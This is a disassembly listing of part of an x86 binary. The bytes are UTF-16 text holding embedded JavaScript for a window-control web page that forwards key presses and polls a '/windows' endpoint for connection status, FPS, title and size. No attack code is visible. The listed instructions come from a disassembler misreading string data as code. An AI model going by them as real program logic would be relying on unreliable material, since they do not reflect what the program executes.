  407475:	7d 00                	jge    0x407477
  407477:	20 00                	and    %al,(%eax)
  407479:	65 00 6c 00 73       	add    %ch,%gs:0x73(%eax,%eax,1)
  40747e:	00 65 00             	add    %ah,0x0(%ebp)
  407481:	20 00                	and    %al,(%eax)
  407483:	7b 00                	jnp    0x407485
  407485:	20 00                	and    %al,(%eax)
  407487:	70 00                	jo     0x407489
  407489:	6f                   	outsl  %ds:(%esi),(%dx)
  40748a:	00 73 00             	add    %dh,0x0(%ebx)
  40748d:	74 00                	je     0x40748f
  40748f:	28 00                	sub    %al,(%eax)
  407491:	7b 00                	jnp    0x407493
  407493:	74 00                	je     0x407495
  407495:	79 00                	jns    0x407497
  407497:	70 00                	jo     0x407499
  407499:	65 00 3a             	add    %bh,%gs:(%edx)
  40749c:	00 27                	add    %ah,(%edi)
  40749e:	00 6b 00             	add    %ch,0x0(%ebx)
  4074a1:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4074a5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4074a9:	77 00                	ja     0x4074ab
  4074ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ac:	00 27                	add    %ah,(%edi)
  4074ae:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4074b1:	6b 00 65             	imul   $0x65,(%eax),%eax
  4074b4:	00 79 00             	add    %bh,0x0(%ecx)
  4074b7:	3a 00                	cmp    (%eax),%al
  4074b9:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4074bd:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4074c1:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4074c5:	2c 00                	sub    $0x0,%al
  4074c7:	6b 00 65             	imul   $0x65,(%eax),%eax
  4074ca:	00 79 00             	add    %bh,0x0(%ecx)
  4074cd:	43                   	inc    %ebx
  4074ce:	00 6f 00             	add    %ch,0x0(%edi)
  4074d1:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4074d5:	3a 00                	cmp    (%eax),%al
  4074d7:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4074db:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4074df:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4074e3:	43                   	inc    %ebx
  4074e4:	00 6f 00             	add    %ch,0x0(%edi)
  4074e7:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4074eb:	7c 00                	jl     0x4074ed
  4074ed:	7c 00                	jl     0x4074ef
  4074ef:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4074f3:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  4074f7:	68 00 69 00 63       	push   $0x63006900
  4074fc:	00 68 00             	add    %ch,0x0(%eax)
  4074ff:	7c 00                	jl     0x407501
  407501:	7c 00                	jl     0x407503
  407503:	30 00                	xor    %al,(%eax)
  407505:	7d 00                	jge    0x407507
  407507:	29 00                	sub    %eax,(%eax)
  407509:	3b 00                	cmp    (%eax),%eax
  40750b:	20 00                	and    %al,(%eax)
  40750d:	7d 00                	jge    0x40750f
  40750f:	20 00                	and    %al,(%eax)
  407511:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407515:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  407519:	72 00                	jb     0x40751b
  40751b:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40751f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407523:	74 00                	je     0x407525
  407525:	44                   	inc    %esp
  407526:	00 65 00             	add    %ah,0x0(%ebp)
  407529:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40752d:	75 00                	jne    0x40752f
  40752f:	6c                   	insb   (%dx),%es:(%edi)
  407530:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  407534:	00 29                	add    %ch,(%ecx)
  407536:	00 3b                	add    %bh,(%ebx)
  407538:	00 20                	add    %ah,(%eax)
  40753a:	00 7d 00             	add    %bh,0x0(%ebp)
  40753d:	29 00                	sub    %eax,(%eax)
  40753f:	3b 00                	cmp    (%eax),%eax
  407541:	0a 00                	or     (%eax),%al
  407543:	20 00                	and    %al,(%eax)
  407545:	20 00                	and    %al,(%eax)
  407547:	77 00                	ja     0x407549
  407549:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40754f:	6f                   	outsl  %ds:(%esi),(%dx)
  407550:	00 77 00             	add    %dh,0x0(%edi)
  407553:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  407557:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  40755c:	00 76 00             	add    %dh,0x0(%esi)
  40755f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407563:	74 00                	je     0x407565
  407565:	4c                   	dec    %esp
  407566:	00 69 00             	add    %ch,0x0(%ecx)
  407569:	73 00                	jae    0x40756b
  40756b:	74 00                	je     0x40756d
  40756d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407571:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407575:	28 00                	sub    %al,(%eax)
  407577:	27                   	daa
  407578:	00 6b 00             	add    %ch,0x0(%ebx)
  40757b:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40757f:	75 00                	jne    0x407581
  407581:	70 00                	jo     0x407583
  407583:	27                   	daa
  407584:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407587:	20 00                	and    %al,(%eax)
  407589:	20 00                	and    %al,(%eax)
  40758b:	20 00                	and    %al,(%eax)
  40758d:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  407591:	6e                   	outsb  %ds:(%esi),(%dx)
  407592:	00 63 00             	add    %ah,0x0(%ebx)
  407595:	74 00                	je     0x407597
  407597:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40759d:	28 00                	sub    %al,(%eax)
  40759f:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4075a3:	29 00                	sub    %eax,(%eax)
  4075a5:	7b 00                	jnp    0x4075a7
  4075a7:	20 00                	and    %al,(%eax)
  4075a9:	69 00 66 00 28 00    	imul   $0x280066,(%eax),%eax
  4075af:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4075b3:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4075b7:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4075bb:	20 00                	and    %al,(%eax)
  4075bd:	26 00 26             	add    %ah,%es:(%esi)
  4075c0:	00 20                	add    %ah,(%eax)
  4075c2:	00 65 00             	add    %ah,0x0(%ebp)
  4075c5:	76 00                	jbe    0x4075c7
  4075c7:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4075cb:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4075cf:	2e 00 6c 00 65       	add    %ch,%cs:0x65(%eax,%eax,1)
  4075d4:	00 6e 00             	add    %ch,0x0(%esi)
  4075d7:	67 00 74 00          	add    %dh,0x0(%si)
  4075db:	68 00 3e 00 31       	push   $0x31003e00
  4075e0:	00 29                	add    %ch,(%ecx)
  4075e2:	00 7b 00             	add    %bh,0x0(%ebx)
  4075e5:	20 00                	and    %al,(%eax)
  4075e7:	70 00                	jo     0x4075e9
  4075e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ea:	00 73 00             	add    %dh,0x0(%ebx)
  4075ed:	74 00                	je     0x4075ef
  4075ef:	28 00                	sub    %al,(%eax)
  4075f1:	7b 00                	jnp    0x4075f3
  4075f3:	74 00                	je     0x4075f5
  4075f5:	79 00                	jns    0x4075f7
  4075f7:	70 00                	jo     0x4075f9
  4075f9:	65 00 3a             	add    %bh,%gs:(%edx)
  4075fc:	00 27                	add    %ah,(%edi)
  4075fe:	00 6b 00             	add    %ch,0x0(%ebx)
  407601:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  407605:	75 00                	jne    0x407607
  407607:	70 00                	jo     0x407609
  407609:	27                   	daa
  40760a:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40760d:	6b 00 65             	imul   $0x65,(%eax),%eax
  407610:	00 79 00             	add    %bh,0x0(%ecx)
  407613:	3a 00                	cmp    (%eax),%al
  407615:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407619:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40761d:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  407621:	2c 00                	sub    $0x0,%al
  407623:	6b 00 65             	imul   $0x65,(%eax),%eax
  407626:	00 79 00             	add    %bh,0x0(%ecx)
  407629:	43                   	inc    %ebx
  40762a:	00 6f 00             	add    %ch,0x0(%edi)
  40762d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407631:	3a 00                	cmp    (%eax),%al
  407633:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407637:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40763b:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40763f:	43                   	inc    %ebx
  407640:	00 6f 00             	add    %ch,0x0(%edi)
  407643:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407647:	7c 00                	jl     0x407649
  407649:	7c 00                	jl     0x40764b
  40764b:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40764f:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  407653:	68 00 69 00 63       	push   $0x63006900
  407658:	00 68 00             	add    %ch,0x0(%eax)
  40765b:	7c 00                	jl     0x40765d
  40765d:	7c 00                	jl     0x40765f
  40765f:	30 00                	xor    %al,(%eax)
  407661:	7d 00                	jge    0x407663
  407663:	29 00                	sub    %eax,(%eax)
  407665:	3b 00                	cmp    (%eax),%eax
  407667:	20 00                	and    %al,(%eax)
  407669:	7d 00                	jge    0x40766b
  40766b:	20 00                	and    %al,(%eax)
  40766d:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407671:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  407675:	72 00                	jb     0x407677
  407677:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40767b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40767f:	74 00                	je     0x407681
  407681:	44                   	inc    %esp
  407682:	00 65 00             	add    %ah,0x0(%ebp)
  407685:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407689:	75 00                	jne    0x40768b
  40768b:	6c                   	insb   (%dx),%es:(%edi)
  40768c:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  407690:	00 29                	add    %ch,(%ecx)
  407692:	00 3b                	add    %bh,(%ebx)
  407694:	00 20                	add    %ah,(%eax)
  407696:	00 7d 00             	add    %bh,0x0(%ebp)
  407699:	29 00                	sub    %eax,(%eax)
  40769b:	3b 00                	cmp    (%eax),%eax
  40769d:	0a 00                	or     (%eax),%al
  40769f:	0a 00                	or     (%eax),%al
  4076a1:	20 00                	and    %al,(%eax)
  4076a3:	20 00                	and    %al,(%eax)
  4076a5:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4076a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4076aa:	00 63 00             	add    %ah,0x0(%ebx)
  4076ad:	74 00                	je     0x4076af
  4076af:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4076b5:	20 00                	and    %al,(%eax)
  4076b7:	72 00                	jb     0x4076b9
  4076b9:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  4076bd:	72 00                	jb     0x4076bf
  4076bf:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4076c3:	68 00 4d 00 65       	push   $0x65004d00
  4076c8:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4076cc:	00 28                	add    %ch,(%eax)
  4076ce:	00 29                	add    %ch,(%ecx)
  4076d0:	00 7b 00             	add    %bh,0x0(%ebx)
  4076d3:	0a 00                	or     (%eax),%al
  4076d5:	20 00                	and    %al,(%eax)
  4076d7:	20 00                	and    %al,(%eax)
  4076d9:	20 00                	and    %al,(%eax)
  4076db:	20 00                	and    %al,(%eax)
  4076dd:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  4076e1:	74 00                	je     0x4076e3
  4076e3:	63 00                	arpl   %eax,(%eax)
  4076e5:	68 00 28 00 27       	push   $0x27002800
  4076ea:	00 2f                	add    %ch,(%edi)
  4076ec:	00 77 00             	add    %dh,0x0(%edi)
  4076ef:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4076f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f6:	00 77 00             	add    %dh,0x0(%edi)
  4076f9:	73 00                	jae    0x4076fb
  4076fb:	27                   	daa
  4076fc:	00 29                	add    %ch,(%ecx)
  4076fe:	00 2e                	add    %ch,(%esi)
  407700:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  407704:	00 65 00             	add    %ah,0x0(%ebp)
  407707:	6e                   	outsb  %ds:(%esi),(%dx)
  407708:	00 28                	add    %ch,(%eax)
  40770a:	00 72 00             	add    %dh,0x0(%edx)
  40770d:	3d 00 3e 00 72       	cmp    $0x72003e00,%eax
  407712:	00 2e                	add    %ch,(%esi)
  407714:	00 6a 00             	add    %ch,0x0(%edx)
  407717:	73 00                	jae    0x407719
  407719:	6f                   	outsl  %ds:(%esi),(%dx)
  40771a:	00 6e 00             	add    %ch,0x0(%esi)
  40771d:	28 00                	sub    %al,(%eax)
  40771f:	29 00                	sub    %eax,(%eax)
  407721:	29 00                	sub    %eax,(%eax)
  407723:	2e 00 74 00 68       	add    %dh,%cs:0x68(%eax,%eax,1)
  407728:	00 65 00             	add    %ah,0x0(%ebp)
  40772b:	6e                   	outsb  %ds:(%esi),(%dx)
  40772c:	00 28                	add    %ch,(%eax)
  40772e:	00 6a 00             	add    %ch,0x0(%edx)
  407731:	3d 00 3e 00 7b       	cmp    $0x7b003e00,%eax
  407736:	00 0a                	add    %cl,(%edx)
  407738:	00 20                	add    %ah,(%eax)
  40773a:	00 20                	add    %ah,(%eax)
  40773c:	00 20                	add    %ah,(%eax)
  40773e:	00 20                	add    %ah,(%eax)
  407740:	00 20                	add    %ah,(%eax)
  407742:	00 20                	add    %ah,(%eax)
  407744:	00 73 00             	add    %dh,0x0(%ebx)
  407747:	74 00                	je     0x407749
  407749:	61                   	popa
  40774a:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40774e:	00 73 00             	add    %dh,0x0(%ebx)
  407751:	45                   	inc    %ebp
  407752:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407756:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40775a:	00 78 00             	add    %bh,0x0(%eax)
  40775d:	74 00                	je     0x40775f
  40775f:	43                   	inc    %ebx
  407760:	00 6f 00             	add    %ch,0x0(%edi)
  407763:	6e                   	outsb  %ds:(%esi),(%dx)
  407764:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407768:	00 6e 00             	add    %ch,0x0(%esi)
  40776b:	74 00                	je     0x40776d
  40776d:	20 00                	and    %al,(%eax)
  40776f:	3d 00 20 00 6a       	cmp    $0x6a002000,%eax
  407774:	00 2e                	add    %ch,(%esi)
  407776:	00 63 00             	add    %ah,0x0(%ebx)
  407779:	6f                   	outsl  %ds:(%esi),(%dx)
  40777a:	00 6e 00             	add    %ch,0x0(%esi)
  40777d:	6e                   	outsb  %ds:(%esi),(%dx)
  40777e:	00 65 00             	add    %ah,0x0(%ebp)
  407781:	63 00                	arpl   %eax,(%eax)
  407783:	74 00                	je     0x407785
  407785:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40778a:	00 3f                	add    %bh,(%edi)
  40778c:	00 20                	add    %ah,(%eax)
  40778e:	00 27                	add    %ah,(%edi)
  407790:	00 43 00             	add    %al,0x0(%ebx)
  407793:	6f                   	outsl  %ds:(%esi),(%dx)
  407794:	00 6e 00             	add    %ch,0x0(%esi)
  407797:	6e                   	outsb  %ds:(%esi),(%dx)
  407798:	00 65 00             	add    %ah,0x0(%ebp)
  40779b:	63 00                	arpl   %eax,(%eax)
  40779d:	74 00                	je     0x40779f
  40779f:	65 00 64 00 27       	add    %ah,%gs:0x27(%eax,%eax,1)
  4077a4:	00 20                	add    %ah,(%eax)
  4077a6:	00 3a                	add    %bh,(%edx)
  4077a8:	00 20                	add    %ah,(%eax)
  4077aa:	00 27                	add    %ah,(%edi)
  4077ac:	00 4e 00             	add    %cl,0x0(%esi)
  4077af:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b0:	00 20                	add    %ah,(%eax)
  4077b2:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4077b6:	00 72 00             	add    %dh,0x0(%edx)
  4077b9:	67 00 65 00          	add    %ah,0x0(%di)
  4077bd:	74 00                	je     0x4077bf
  4077bf:	27                   	daa
  4077c0:	00 3b                	add    %bh,(%ebx)
  4077c2:	00 0a                	add    %cl,(%edx)
  4077c4:	00 20                	add    %ah,(%eax)
  4077c6:	00 20                	add    %ah,(%eax)
  4077c8:	00 20                	add    %ah,(%eax)
  4077ca:	00 20                	add    %ah,(%eax)
  4077cc:	00 20                	add    %ah,(%eax)
  4077ce:	00 20                	add    %ah,(%eax)
  4077d0:	00 73 00             	add    %dh,0x0(%ebx)
  4077d3:	74 00                	je     0x4077d5
  4077d5:	61                   	popa
  4077d6:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4077da:	00 73 00             	add    %dh,0x0(%ebx)
  4077dd:	45                   	inc    %ebp
  4077de:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  4077e2:	00 63 00             	add    %ah,0x0(%ebx)
  4077e5:	6c                   	insb   (%dx),%es:(%edi)
  4077e6:	00 61 00             	add    %ah,0x0(%ecx)
  4077e9:	73 00                	jae    0x4077eb
  4077eb:	73 00                	jae    0x4077ed
  4077ed:	4e                   	dec    %esi
  4077ee:	00 61 00             	add    %ah,0x0(%ecx)
  4077f1:	6d                   	insl   (%dx),%es:(%edi)
  4077f2:	00 65 00             	add    %ah,0x0(%ebp)
  4077f5:	20 00                	and    %al,(%eax)
  4077f7:	3d 00 20 00 6a       	cmp    $0x6a002000,%eax
  4077fc:	00 2e                	add    %ch,(%esi)
  4077fe:	00 63 00             	add    %ah,0x0(%ebx)
  407801:	6f                   	outsl  %ds:(%esi),(%dx)
  407802:	00 6e 00             	add    %ch,0x0(%esi)
  407805:	6e                   	outsb  %ds:(%esi),(%dx)
  407806:	00 65 00             	add    %ah,0x0(%ebp)
  407809:	63 00                	arpl   %eax,(%eax)
  40780b:	74 00                	je     0x40780d
  40780d:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  407812:	00 3f                	add    %bh,(%edi)
  407814:	00 20                	add    %ah,(%eax)
  407816:	00 27                	add    %ah,(%edi)
  407818:	00 6f 00             	add    %ch,0x0(%edi)
  40781b:	6b 00 27             	imul   $0x27,(%eax),%eax
  40781e:	00 20                	add    %ah,(%eax)
  407820:	00 3a                	add    %bh,(%edx)
  407822:	00 20                	add    %ah,(%eax)
  407824:	00 27                	add    %ah,(%edi)
  407826:	00 62 00             	add    %ah,0x0(%edx)
  407829:	61                   	popa
  40782a:	00 64 00 27          	add    %ah,0x27(%eax,%eax,1)
  40782e:	00 3b                	add    %bh,(%ebx)
  407830:	00 0a                	add    %cl,(%edx)
  407832:	00 20                	add    %ah,(%eax)
  407834:	00 20                	add    %ah,(%eax)
  407836:	00 20                	add    %ah,(%eax)
  407838:	00 20                	add    %ah,(%eax)
  40783a:	00 20                	add    %ah,(%eax)
  40783c:	00 20                	add    %ah,(%eax)
  40783e:	00 66 00             	add    %ah,0x0(%esi)
  407841:	70 00                	jo     0x407843
  407843:	73 00                	jae    0x407845
  407845:	45                   	inc    %ebp
  407846:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40784a:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40784e:	00 78 00             	add    %bh,0x0(%eax)
  407851:	74 00                	je     0x407853
  407853:	43                   	inc    %ebx
  407854:	00 6f 00             	add    %ch,0x0(%edi)
  407857:	6e                   	outsb  %ds:(%esi),(%dx)
  407858:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40785c:	00 6e 00             	add    %ch,0x0(%esi)
  40785f:	74 00                	je     0x407861
  407861:	20 00                	and    %al,(%eax)
  407863:	3d 00 20 00 28       	cmp    $0x28002000,%eax
  407868:	00 6a 00             	add    %ch,0x0(%edx)
  40786b:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  40786f:	70 00                	jo     0x407871
  407871:	73 00                	jae    0x407873
  407873:	7c 00                	jl     0x407875
  407875:	7c 00                	jl     0x407877
  407877:	30 00                	xor    %al,(%eax)
  407879:	29 00                	sub    %eax,(%eax)
  40787b:	2e 00 74 00 6f       	add    %dh,%cs:0x6f(%eax,%eax,1)
  407880:	00 46 00             	add    %al,0x0(%esi)
  407883:	69 00 78 00 65 00    	imul   $0x650078,(%eax),%eax
  407889:	64 00 20             	add    %ah,%fs:(%eax)
  40788c:	00 3f                	add    %bh,(%edi)
  40788e:	00 20                	add    %ah,(%eax)
  407890:	00 6a 00             	add    %ch,0x0(%edx)
  407893:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  407897:	70 00                	jo     0x407899
  407899:	73 00                	jae    0x40789b
  40789b:	2e 00 74 00 6f       	add    %dh,%cs:0x6f(%eax,%eax,1)
  4078a0:	00 46 00             	add    %al,0x0(%esi)
  4078a3:	69 00 78 00 65 00    	imul   $0x650078,(%eax),%eax
  4078a9:	64 00 28             	add    %ch,%fs:(%eax)
  4078ac:	00 31                	add    %dh,(%ecx)
  4078ae:	00 29                	add    %ch,(%ecx)
  4078b0:	00 20                	add    %ah,(%eax)
  4078b2:	00 3a                	add    %bh,(%edx)
  4078b4:	00 20                	add    %ah,(%eax)
  4078b6:	00 6a 00             	add    %ch,0x0(%edx)
  4078b9:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  4078bd:	70 00                	jo     0x4078bf
  4078bf:	73 00                	jae    0x4078c1
  4078c1:	3b 00                	cmp    (%eax),%eax
  4078c3:	0a 00                	or     (%eax),%al
  4078c5:	20 00                	and    %al,(%eax)
  4078c7:	20 00                	and    %al,(%eax)
  4078c9:	20 00                	and    %al,(%eax)
  4078cb:	20 00                	and    %al,(%eax)
  4078cd:	20 00                	and    %al,(%eax)
  4078cf:	20 00                	and    %al,(%eax)
  4078d1:	74 00                	je     0x4078d3
  4078d3:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  4078d9:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4078dd:	6c                   	insb   (%dx),%es:(%edi)
  4078de:	00 2e                	add    %ch,(%esi)
  4078e0:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4078e4:	00 78 00             	add    %bh,0x0(%eax)
  4078e7:	74 00                	je     0x4078e9
  4078e9:	43                   	inc    %ebx
  4078ea:	00 6f 00             	add    %ch,0x0(%edi)
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4078f2:	00 6e 00             	add    %ch,0x0(%esi)
  4078f5:	74 00                	je     0x4078f7
  4078f7:	20 00                	and    %al,(%eax)
  4078f9:	3d 00 20 00 6a       	cmp    $0x6a002000,%eax
  4078fe:	00 2e                	add    %ch,(%esi)
  407900:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407904:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  407908:	00 65 00             	add    %ah,0x0(%ebp)
  40790b:	20 00                	and    %al,(%eax)
  40790d:	7c 00                	jl     0x40790f
  40790f:	7c 00                	jl     0x407911
  407911:	20 00                	and    %al,(%eax)
  407913:	27                   	daa
  407914:	00 28                	add    %ch,(%eax)
  407916:	00 6e 00             	add    %ch,0x0(%esi)
  407919:	6f                   	outsl  %ds:(%esi),(%dx)
  40791a:	00 6e 00             	add    %ch,0x0(%esi)
  40791d:	65 00 29             	add    %ch,%gs:(%ecx)
  407920:	00 27                	add    %ah,(%edi)
  407922:	00 3b                	add    %bh,(%ebx)
  407924:	00 0a                	add    %cl,(%edx)
  407926:	00 20                	add    %ah,(%eax)
  407928:	00 20                	add    %ah,(%eax)
  40792a:	00 20                	add    %ah,(%eax)
  40792c:	00 20                	add    %ah,(%eax)
  40792e:	00 20                	add    %ah,(%eax)
  407930:	00 20                	add    %ah,(%eax)
  407932:	00 73 00             	add    %dh,0x0(%ebx)
  407935:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  40793b:	45                   	inc    %ebp
  40793c:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407940:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407944:	00 78 00             	add    %bh,0x0(%eax)
  407947:	74 00                	je     0x407949
  407949:	43                   	inc    %ebx
  40794a:	00 6f 00             	add    %ch,0x0(%edi)
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407952:	00 6e 00             	add    %ch,0x0(%esi)
  407955:	74 00                	je     0x407957
  407957:	20 00                	and    %al,(%eax)
  407959:	3d 00 20 00 28       	cmp    $0x28002000,%eax
  40795e:	00 6a 00             	add    %ch,0x0(%edx)
  407961:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  407965:	69 00 64 00 74 00    	imul   $0x740064,(%eax),%eax
  40796b:	68 00 7c 00 7c       	push   $0x7c007c00
  407970:	00 30                	add    %dh,(%eax)
  407972:	00 29                	add    %ch,(%ecx)
  407974:	00 20                	add    %ah,(%eax)
  407976:	00 2b                	add    %ch,(%ebx)
  407978:	00 20                	add    %ah,(%eax)
  40797a:	00 27                	add    %ah,(%edi)
  40797c:	00 78 00             	add    %bh,0x0(%eax)
  40797f:	27                   	daa
  407980:	00 20                	add    %ah,(%eax)
  407982:	00 2b                	add    %ch,(%ebx)
  407984:	00 20                	add    %ah,(%eax)
  407986:	00 28                	add    %ch,(%eax)
  407988:	00 6a 00             	add    %ch,0x0(%edx)
  40798b:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  40798f:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  407993:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  407997:	74 00                	je     0x407999
  407999:	7c 00                	jl     0x40799b
  40799b:	7c 00                	jl     0x40799d
  40799d:	30 00                	xor    %al,(%eax)
  40799f:	29 00                	sub    %eax,(%eax)
  4079a1:	3b 00                	cmp    (%eax),%eax
  4079a3:	0a 00                	or     (%eax),%al
  4079a5:	20 00                	and    %al,(%eax)
  4079a7:	20 00                	and    %al,(%eax)
  4079a9:	20 00                	and    %al,(%eax)
  4079ab:	20 00                	and    %al,(%eax)
  4079ad:	7d 00                	jge    0x4079af
  4079af:	29 00                	sub    %eax,(%eax)
  4079b1:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4079b5:	61                   	popa
  4079b6:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  4079ba:	00 68 00             	add    %ch,0x0(%eax)
  4079bd:	28 00                	sub    %al,(%eax)
  4079bf:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4079c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4079c4:	00 63 00             	add    %ah,0x0(%ebx)
  4079c7:	74 00                	je     0x4079c9
  4079c9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4079cf:	28 00                	sub    %al,(%eax)
  4079d1:	29 00                	sub    %eax,(%eax)
  4079d3:	7b 00                	jnp    0x4079d5
  4079d5:	20 00                	and    %al,(%eax)
  4079d7:	73 00                	jae    0x4079d9
  4079d9:	74 00                	je     0x4079db
  4079db:	61                   	popa
  4079dc:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4079e0:	00 73 00             	add    %dh,0x0(%ebx)
  4079e3:	45                   	inc    %ebp
  4079e4:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  4079e8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4079ec:	00 78 00             	add    %bh,0x0(%eax)
  4079ef:	74 00                	je     0x4079f1
  4079f1:	43                   	inc    %ebx
  4079f2:	00 6f 00             	add    %ch,0x0(%edi)
  4079f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f6:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4079fa:	00 6e 00             	add    %ch,0x0(%esi)
  4079fd:	74 00                	je     0x4079ff
  4079ff:	3d 00 27 00 44       	cmp    $0x44002700,%eax
  407a04:	00 69 00             	add    %ch,0x0(%ecx)
  407a07:	73 00                	jae    0x407a09
  407a09:	63 00                	arpl   %eax,(%eax)
  407a0b:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0c:	00 6e 00             	add    %ch,0x0(%esi)
  407a0f:	6e                   	outsb  %ds:(%esi),(%dx)
  407a10:	00 65 00             	add    %ah,0x0(%ebp)
  407a13:	63 00                	arpl   %eax,(%eax)
  407a15:	74 00                	je     0x407a17
  407a17:	65 00 64 00 27       	add    %ah,%gs:0x27(%eax,%eax,1)
  407a1c:	00 3b                	add    %bh,(%ebx)
  407a1e:	00 20                	add    %ah,(%eax)
  407a20:	00 73 00             	add    %dh,0x0(%ebx)
  407a23:	74 00                	je     0x407a25
  407a25:	61                   	popa
  407a26:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  407a2a:	00 73 00             	add    %dh,0x0(%ebx)
  407a2d:	45                   	inc    %ebp
  407a2e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407a32:	00 63 00             	add    %ah,0x0(%ebx)
